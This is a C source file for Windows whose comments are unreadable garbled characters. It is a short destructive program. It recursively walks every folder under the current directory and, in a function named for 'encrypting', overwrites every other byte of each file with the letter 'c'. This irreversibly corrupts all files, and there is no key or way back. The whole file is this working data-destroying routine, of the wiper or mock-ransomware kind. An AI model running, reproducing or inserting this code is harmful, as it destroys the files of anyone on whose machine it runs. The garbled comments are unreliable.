#include <stdio.h>
#include <windows.h>
//�����ļ���
void findFile(char* pathName);

void jiami(char* fileName);


int main(){

	char currentDir[MAX_PATH] = { 0 };

	GetCurrentDirectory(MAX_PATH, currentDir);

	findFile(currentDir);


//	jiami("1.txt");


	while (1);
	return 0;
}



//�����ļ���
void findFile(char* pathName){
	//1 ��pathName�ļ����µ�һ���ļ�
	//1.1 ׼�����ļ�������·��
	char fileName[MAX_PATH] = { 0 };//windows����ϵͳ���ļ�����С���260
	sprintf(fileName, "%s\\*.*", pathName);//*��Ӧ����������ַ�
	
	//1.2 ���ļ�
	WIN32_FIND_DATA findData;
	HANDLE hFile = FindFirstFile(fileName, &findData);
	if (INVALID_HANDLE_VALUE == hFile){
		return;
	}
	char temp[MAX_PATH];
	int ret = 1;
	while (ret){
		if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){
			//2 ���ļ���
			if (findData.cFileName[0] != '.'){//�ų���. �� ..
				//2.1 ���ļ��е����ּӵ�·����ͷ
				memset(temp, 0, MAX_PATH);//�������
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("�ļ���:%s\n", temp);
				//2.2 �����ļ������ļ�
				findFile(temp);
			}
			
		}
		else{
			//3 ���ļ�
			//3.1 ���ļ����ӵ�·����ͷ
			memset(temp, 0, MAX_PATH);//�������
			sprintf(temp, "%s\\%s", pathName, findData.cFileName);
			printf("�ļ�:%s\n", temp);
			//3.2 Ϊ����Ϊ
			jiami(temp);
		}

		//4 ����һ��
		ret = FindNextFile(hFile, &findData);
		//if (!ret) break;
	}
}

void jiami(char* fileName){
	//1. ���ļ�
	FILE* fp = fopen(fileName, "r+b");//�����ƶ�д��ʽ���ļ�
	if (fp == NULL){
		return;
	}
	//2. ����
	//2.1 ��ȡ�ļ���С
	fseek(fp, 0, SEEK_END);//�����ļ�����ָ�뵽�ļ�ĩβ
	int size = ftell(fp);//��ȡ�ļ�����ָ������ļ�ͷ���ֽ���
	fseek(fp, 0, SEEK_SET);//�����ļ�����ָ�뵽�ļ�ͷ
	//2.2 ��һ���ֽڲ���һ���ֽ�
	char c = 'c';
	for (int i = 0; i < size; i++){
		fwrite(&c, 1, 1, fp);//д��һ���ֽڵ��ļ���
		fseek(fp, 1, SEEK_CUR);
	}


	//3. �ر��ļ�
	fclose(fp);
}